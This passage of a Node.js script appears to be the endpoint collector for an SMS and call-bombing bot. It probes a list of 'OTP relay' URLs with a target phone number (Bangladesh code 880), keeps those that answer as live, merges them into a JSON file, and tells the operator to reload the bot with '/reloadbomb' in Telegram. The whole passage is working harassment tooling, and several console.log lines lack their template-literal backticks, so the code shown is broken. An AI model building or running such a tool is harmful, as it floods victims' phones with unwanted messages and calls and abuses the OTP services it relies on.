// ── generic OTP relays seen in the wild (community lists) ──
    { name:'otp-relay-1', url:'https://api.sms-relay.xyz/v1/send?to={phone}&msg=code', method:'GET', headers:{'User-Agent':UA}, successKeyword:'ok', cc:'880' },
    { name:'otp-relay-2', url:'https://sms-gateway.example.net/api?phone={phone}', method:'GET', headers:{'User-Agent':UA}, successKeyword:'sent', cc:'880' },
];

// ── probe one endpoint ─────────────────────────────────
async function probe(ep, phone) {
    const url = ep.url.replace(/\{phone\}/g, phone).replace(/\{cc\}/g, ep.cc || '880').replace(/\{rand\}/g, crypto.randomBytes(4).toString('hex'));
    const body = ep.body ? ep.body.replace(/\{phone\}/g, phone) : undefined;
    const headers = ep.headers || { 'User-Agent': UA };
    try {
        const r = ep.method === 'POST'
            ? await axios.post(url, body || '', { headers, timeout: 10000, validateStatus: () => true })
            : await axios.get(url, { headers, timeout: 10000, validateStatus: () => true });
        const httpOk = r.status >= 200 && r.status < 400;
        const bodyStr = typeof r.data === 'string' ? r.data : JSON.stringify(r.data || '');
        const keywordOk = ep.successKeyword ? bodyStr.includes(ep.successKeyword) : true;
        const live = httpOk && keywordOk;
        return { live, status: r.status, sample: bodyStr.slice(0, 120), ep };
    } catch (e) {
        return { live: false, status: 0, error: e.code || e.message, ep };
    }
}

// ── main ───────────────────────────────────────────────
(async () => {
    if (!TEST_PHONE && !DRY) {
        console.log('[Collector] No test phone provided.');
        console.log('[Collector] Usage: node collector.js +8801712345678');
        console.log('[Collector]    or: node collector.js --dry     (probe without SMS)');
        console.log('[Collector] Running in DRY mode — will only check HTTP reachability, not SMS delivery.');
    }
    const phone = TEST_PHONE ? TEST_PHONE.replace(/^\+/, '') : '8801700000000';
    console.log([Collector] Probing ${SEED.length} endpoints${DRY ? ' (dry)' :  with +${phone}}\n);

    const working = { sms: [], call: [] };
    const dead = [];

    for (let i = 0; i < SEED.length; i++) {
        const ep = SEED[i];
        const r = await probe(ep, phone);
        const mark = r.live ? '✅' : '❌';
        console.log(${mark} [${i+1}/${SEED.length}] ${ep.name.padEnd(20)} status=${r.status}${r.error ? ' err=' + r.error : ''});
        if (r.live) {
            working.sms.push({
                name: ep.name,
                url: ep.url,
                method: ep.method,
                headers: ep.headers,
                body: ep.body,
                successKeyword: ep.successKeyword,
                cc: ep.cc,
                timeout: 8000,
            });
        } else {
            dead.push({ name: ep.name, status: r.status, error: r.error || r.sample });
        }
        await sleep(DRY ? 300 : 800);
    }

    // merge with existing file if present
    let existing = { sms: [], call: [] };
    try {
        if (fs.existsSync(OUT_FILE)) existing = JSON.parse(fs.readFileSync(OUT_FILE, 'utf8'));
    } catch (e) { /* ignore */ }
    const dedupe = list => {
        const seen = new Set();
        return list.filter(e => { if (seen.has(e.url)) return false; seen.add(e.url); return true; });
    };
    const merged = {
        sms:  dedupe([...(existing.sms  || []), ...working.sms]),
        call: dedupe([...(existing.call || []), ...working.call]),
    };
    fs.writeFileSync(OUT_FILE, JSON.stringify(merged, null, 2));
    console.log(\n[Collector] Wrote ${OUT_FILE});
    console.log([Collector] Total endpoints now: sms=${merged.sms.length} call=${merged.call.length});
    console.log([Collector] This run: ${working.sms.length} live · ${dead.length} dead);
    console.log([Collector] Restart bot to reload, or send /reloadbomb in Telegram.);
})();
